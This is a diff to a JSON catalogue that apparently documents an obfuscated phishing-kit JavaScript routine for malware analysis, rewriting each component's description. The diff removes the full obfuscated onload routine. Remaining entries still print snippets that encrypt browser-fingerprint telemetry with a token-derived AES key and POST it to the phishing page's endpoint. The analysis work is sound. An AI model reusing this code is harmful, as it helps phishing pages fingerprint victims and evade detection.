@@ -160,8 +160,8 @@
             "type": "leaf",
             "category": "Execution",
             "impact": "High",
-            "description": "Event handler binding the entire malicious routine to execution only after full DOM render.",
-            "codeObfuscated": "window[_0x298ade(0x1d4)] = function() {\n    const _0x2b5393 = _0x298ade;\n\n    function _0x540e7e(_0x36065a) {\n        const _0x2bb80e = _0x4140;\n        return document[_0x2bb80e(0x1c7)](_0x36065a);\n    };\n    const _0x52500e = String[_0x2b5393(0x1c8)];\n\n    function _0x4e9aa5(_0x44623d) {\n        let _0x14c7cd = _0x52500e(0x6d, 0x65, 0x74, 0x68, 0x6f, 0x64),\n            _0x1bf05a = _0x52500e(0x50, 0x4f, 0x53, 0x54),\n            _0x4db945 = _0x52500e(0x62, 0x6f, 0x64, 0x79);\n        const _0x327ca9 = window[_0x52500e(0x66, 0x65, 0x74, 0x63, 0x68)],\n            _0x268b37 = _0x52500e(0x2e, 0x2f, 0x69, 0x6e, 0x64, 0x65, 0x78, 0x2e, 0x70, 0x68, 0x70, 0x3f, 0x67, 0x73, 0x61, 0x75, 0x74, 0x68);\n        return _0x327ca9(_0x268b37, {\n            [_0x14c7cd]: _0x1bf05a,\n            [_0x4db945]: _0x44623d\n        });\n    };\n    let _0x384950 = _0x540e7e(_0x2b5393(0x1eb))[_0x2b5393(0x1ed)];\n    const _0x14917c = CryptoJS;\n    let _0xbd05c = _0x540e7e(_0x2b5393(0x1de))[_0x2b5393(0x1ed)][_0x2b5393(0x1e2)](0x0, 0x10),\n        _0x3790eb = _0x14917c[_0x2b5393(0x1d5)][_0x2b5393(0x1d6)][_0x2b5393(0x1ef)](_0xbd05c),\n        _0x4a6672 = _0x14917c[_0x2b5393(0x1d5)]['Utf8'][_0x2b5393(0x1ef)](_0xbd05c[_0x2b5393(0x1cf)]('')[_0x2b5393(0x1fe)]()[_0x2b5393(0x1fd)]('')),\n        _0x174230 = {};\n    _0x174230['r'] = Math['random'](), _0x174230[_0x2b5393(0x1f1)] = _0x384950, _0x174230[_0x2b5393(0x1fb)] = _0x2b5393(0x1e6), _0x174230[_0x2b5393(0x1cb)] = 0x0, _0x174230[_0x2b5393(0x1f4)] = [];\n\n    function _0xd626f5() {\n        const _0x488359 = _0x2b5393;\n        let _0x42f78a = ![];\n        for (let _0xd7b27a in window) {\n            if (typeof window[_0xd7b27a] === 'function') {\n                if (_0xd7b27a[_0x488359(0x1d1)](_0x488359(0x1df)) === 0x0) _0x42f78a = !![];\n                if (!_0x42f78a) _0x174230[_0x488359(0x1fb)] = _0xd7b27a;\n                let _0x3319d3 = window[_0xd7b27a][_0x488359(0x1d2)]()[_0x488359(0x1f6)]();\n                _0x3319d3['indexOf'](_0x488359(0x1e3)) === -0x1 && !(_0x3319d3[_0x488359(0x1d1)](_0x488359(0x1d3)) === 0x0) && !(_0xd7b27a[_0x488359(0x1d1)](_0x488359(0x1df)) === 0x0) && (_0x174230['injfn']++, _0x174230[_0x488359(0x1f4)][_0x488359(0x1e5)](_0xd7b27a));\n            }\n        }\n    }\n    _0xd626f5();\n\n    function _0x34b50e() {\n        const _0x490a1e = _0x2b5393;\n        let _0x28607e = [];\n        for (let _0x230243 in window) {\n            _0x28607e[_0x490a1e(0x1e5)](_0x230243);\n        }\n        _0x174230[_0x490a1e(0x1cd)] = _0x14917c['MD5'](JSON[_0x490a1e(0x1e9)](_0x28607e))['toString'](), _0x28607e = [], _0x28607e = Object[_0x490a1e(0x1c9)](window), _0x174230[_0x490a1e(0x1ea)] = _0x14917c[_0x490a1e(0x1dd)](JSON[_0x490a1e(0x1e9)](_0x28607e))['toString'](), _0x28607e = [];\n        for (let _0x5d077f in navigator) {\n            _0x28607e['push'](_0x5d077f);\n        }\n        _0x174230[_0x490a1e(0x1e0)] = _0x14917c[_0x490a1e(0x1dd)](JSON[_0x490a1e(0x1e9)](_0x28607e))['toString'](), _0x28607e = [];\n        let _0x43c74d = document[_0x490a1e(0x1e8)]('div');\n        for (let _0x38aa79 in _0x43c74d) {\n            _0x28607e[_0x490a1e(0x1e5)](_0x38aa79);\n        }\n        let _0x44baea = getComputedStyle(_0x43c74d);\n        for (let _0x23a84f in _0x44baea) {\n            _0x28607e[_0x490a1e(0x1e5)](_0x23a84f);\n        }\n        _0x174230[_0x490a1e(0x1ee)] = _0x14917c['MD5'](JSON['stringify'](_0x28607e))[_0x490a1e(0x1d2)]();\n    }\n    _0x34b50e();\n\n    function _0x154a09() {\n        const _0x29e845 = _0x2b5393;\n        let _0x173029 = document[_0x29e845(0x1f8)][_0x29e845(0x1e7)] - 0x2;\n        _0x174230[_0x29e845(0x1d7)] = _0x173029;\n    }\n    _0x154a09(), _0x174230['dcrfr'] = '';\n    if (document['referrer'] !== '') _0x174230[_0x2b5393(0x1e4)] = document['referrer'];\n    async function _0x433466() {\n        const _0x1995cb = _0x2b5393;\n        if (typeof console[_0x1995cb(0x1fa)] === 'function') console[_0x1995cb(0x1fa)]();\n        let _0x1636dc = JSON[_0x1995cb(0x1e9)](_0x174230);\n        const _0x5a5970 = 'iv',\n            _0x5e8e92 = _0x52500e(0x6d, 0x6f, 0x64, 0x65),\n            _0x16a1b9 = _0x1995cb(0x1f2),\n            _0x2075d5 = _0x14917c['mode'][_0x1995cb(0x1ec)],\n            _0x54afd4 = _0x14917c['pad'][_0x1995cb(0x1ce)],\n            _0x57d201 = _0x3790eb,\n            _0x446b47 = _0x4a6672,\n            _0x5a3565 = {};\n        _0x5a3565[_0x5a5970] = _0x446b47, _0x5a3565[_0x5e8e92] = _0x2075d5, _0x5a3565[_0x16a1b9] = _0x54afd4;\n        let _0x14c534 = _0x14917c[_0x1995cb(0x1cc)][_0x1995cb(0x1f9)](_0x1636dc, _0x57d201, _0x5a3565),\n            _0x15f516 = _0x14c534['toString'](),\n            _0x464231 = await _0x4e9aa5(_0x15f516);\n        if (!_0x464231['ok']) return;\n        actualLink = window[_0x1995cb(0x1d8)]['origin'] + window['location'][_0x1995cb(0x1f0)] + window[_0x1995cb(0x1d8)][_0x1995cb(0x1fc)], window['location'][_0x1995cb(0x1da)] = actualLink;\n    }\n    _0x433466();};"
+            "description": "Event handler that connects the entire attack chain, triggering the execution only after full DOM render.\n New alias declaration of the _0x298ade function.",
+            "codeObfuscated": "window[_0x298ade(0x1d4)] = function() {\n    const _0x2b5393 = _0x298ade; {rest of the attack ...}\n};" 
           },
           {
             "id": "dom-wrapper",
@@ -169,7 +169,7 @@
             "type": "leaf",
             "category": "DOM",
             "impact": "Low",
-            "description": "Wrapper function simplifying calls to document.getElementById.",
+            "description": "Function created simply to emulate document.getElementById() calls.",
             "codeObfuscated": "function _0x540e7e(_0x36065a) {\n    const _0x2bb80e = _0x4140;\n    return document[_0x2bb80e(0x1c7)](_0x36065a);\n};"
           },
           {
@@ -178,7 +178,7 @@
             "type": "leaf",
             "category": "Obfuscation",
             "impact": "Low",
-            "description": "Reference to String.fromCharCode used to assemble ASCII parameter names dynamically.",
+            "description": "Variable created to store a reference (alias) to String.fromCharCode (used to convert numeric values into their respective ASCII characters).",
             "codeObfuscated": "const _0x52500e = String[_0x2b5393(0x1c8)];"
           },
           {
@@ -187,7 +187,7 @@
             "type": "leaf",
             "category": "Exfiltration",
             "impact": "Critical",
-            "description": "Asynchronous HTTP fetch wrapper constructing a POST request to './index.php?gsauth' with the encrypted telemetry body.",
+            "description": "Sends a HTTP Post Request fetch to './index.php?gsauth' with data (_0x44623d) in the body.",
             "codeObfuscated": "function _0x4e9aa5(_0x44623d) {\n    let _0x14c7cd = _0x52500e(0x6d, 0x65, 0x74, 0x68, 0x6f, 0x64),\n        _0x1bf05a = _0x52500e(0x50, 0x4f, 0x53, 0x54),\n        _0x4db945 = _0x52500e(0x62, 0x6f, 0x64, 0x79);\n    const _0x327ca9 = window[_0x52500e(0x66, 0x65, 0x74, 0x63, 0x68)],\n        _0x268b37 = _0x52500e(0x2e, 0x2f, 0x69, 0x6e, 0x64, 0x65, 0x78, 0x2e, 0x70, 0x68, 0x70, 0x3f, 0x67, 0x73, 0x61, 0x75, 0x74, 0x68);\n    return _0x327ca9(_0x268b37, {\n        [_0x14c7cd]: _0x1bf05a,\n        [_0x4db945]: _0x44623d\n    });\n};"
           },
           {
@@ -196,7 +196,7 @@
             "type": "leaf",
             "category": "Crypto",
             "impact": "High",
-            "description": "Reads the first 16 characters of id_gs_token to form the AES key, reverses them for the IV, and prepares the telemetry object (obj1).",
+            "description": "Stores the hidden input's values: the current stage of the phishing flow (document.getElementById('id_gs_step')['value']); the first 16 characters of the id_gs_token (document.getElementById('id_gs_token')['value']['slice'](0, 16)) to create the AES key.\n  Declares an alias to the CryptoJS function and uses the gs_token to create a 128-bit AES secret key and IV (Initialization Vector).\n A dictionary object is created to store the telemetry data, including a random float number, the gs_step, and 3 default values for the injected-function scan (lstfn = 'none', injfn = 0, injfnlst = []), which are filled in later by a function that scans the window object.",
             "codeObfuscated": "let _0x384950 = _0x540e7e(_0x2b5393(0x1eb))[_0x2b5393(0x1ed)];\nconst _0x14917c = CryptoJS;\nlet _0xbd05c = _0x540e7e(_0x2b5393(0x1de))[_0x2b5393(0x1ed)][_0x2b5393(0x1e2)](0x0, 0x10),\n    _0x3790eb = _0x14917c[_0x2b5393(0x1d5)][_0x2b5393(0x1d6)][_0x2b5393(0x1ef)](_0xbd05c),\n    _0x4a6672 = _0x14917c[_0x2b5393(0x1d5)]['Utf8'][_0x2b5393(0x1ef)](_0xbd05c[_0x2b5393(0x1cf)]('')[_0x2b5393(0x1fe)]()[_0x2b5393(0x1fd)]('')),\n    _0x174230 = {};\n_0x174230['r'] = Math['random'](), _0x174230[_0x2b5393(0x1f1)] = _0x384950, _0x174230[_0x2b5393(0x1fb)] = _0x2b5393(0x1e6), _0x174230[_0x2b5393(0x1cb)] = 0x0, _0x174230[_0x2b5393(0x1f4)] = [];"
           }
         ]
